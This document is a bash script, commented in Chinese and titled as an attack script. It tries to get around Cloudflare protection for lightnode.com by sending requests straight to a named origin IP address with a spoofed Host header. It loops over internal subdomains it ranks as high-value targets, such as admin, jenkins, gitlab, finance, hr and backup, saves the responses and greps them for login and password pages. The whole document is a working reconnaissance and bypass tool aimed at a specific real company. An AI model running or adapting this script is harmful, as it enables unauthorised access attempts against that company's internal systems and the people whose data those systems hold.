#!/bin/bash
# 526错误绕过攻击脚本
# Cloudflare 526 = Invalid SSL Certificate

REAL_IP="47.238.114.118"

echo "=== LightNode 526绕过攻击 ==="
echo "真实IP: $REAL_IP"
echo ""

# Tier 1: 最高价值子域名
TIER1_SUBDOMAINS=(
    "admin"
    "jenkins"  
    "gitlab"
    "crm"
    "erp"
    "hr"
    "finance"
    "oa"
)

# Tier 2: 高价值子域名
TIER2_SUBDOMAINS=(
    "dev"
    "test"
    "staging"
    "uat"
    "monitor"
    "log"
    "backup"
    "deploy"
    "ci"
    "cd"
)

echo "=== Tier 1: 最高价值目标 ==="
for sub in "${TIER1_SUBDOMAINS[@]}"; do
    echo "[*] Testing: $sub.lightnode.com"
    
    # 方法1: 直接访问真实IP + Host头
    STATUS=$(curl -skL "https://$REAL_IP" \
        -H "Host: $sub.lightnode.com" \
        --resolve "$sub.lightnode.com:443:$REAL_IP" \
        -w "%{http_code}" -o "/tmp/${sub}_response.html" \
        --connect-timeout 10 2>/dev/null)
    
    echo "    HTTP Status: $STATUS"
    
    # 检查响应内容
    if [ "$STATUS" = "200" ]; then
        echo "    [✅ SUCCESS] 200 OK - 可能绕过成功！"
        
        # 提取关键信息
        grep -iE "(login|username|password|dashboard|admin|welcome)" "/tmp/${sub}_response.html" | head -3
        
    elif [ "$STATUS" = "401" ] || [ "$STATUS" = "403" ]; then
        echo "    [⚠️ AUTH] 需要认证 - 端点存在！"
        
    elif [ "$STATUS" = "526" ]; then
        echo "    [❌ 526] 仍然被Cloudflare拦截"
        
    else
        echo "    [?] 未知状态"
    fi
    
    echo ""
    sleep 1
done

echo ""
echo "=== Tier 2: 高价值目标 ==="
for sub in "${TIER2_SUBDOMAINS[@]}"; do
    echo "[*] Testing: $sub.lightnode.com"
    
    STATUS=$(curl -skL "https://$REAL_IP" \
        -H "Host: $sub.lightnode.com" \
        --resolve "$sub.lightnode.com:443:$REAL_IP" \
        -w "%{http_code}" -o /dev/null \
        --connect-timeout 5 2>/dev/null)
    
    echo "    HTTP Status: $STATUS"
    
    if [ "$STATUS" = "200" ]; then
        echo "    [✅ SUCCESS] 可访问！"
    fi
    
    sleep 1
done

echo ""
echo "=== 攻击完成 ==="
echo "检查 /tmp/*_response.html 查看详细响应"
